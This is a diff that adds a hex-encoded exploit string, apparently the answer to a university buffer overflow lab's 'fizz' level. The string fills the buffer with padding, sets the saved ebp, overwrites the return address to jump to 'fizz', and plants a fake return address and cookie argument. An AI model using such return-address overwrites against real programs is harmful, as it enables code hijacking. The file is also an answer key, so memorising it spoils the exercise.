@@ -1,0 +1,9 @@
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+31 32 33 34 35 36 37 38
+f0 3b 68 55 /* set the ebp value to 55 68 3b f0 */
+76 8c 04 08 /* jump to fizz 08 04 8c 76 */
+e9 00 c3 42 /* set a dummy ret addr */
+e9 00 c3 42 /* set the arg to cookie */
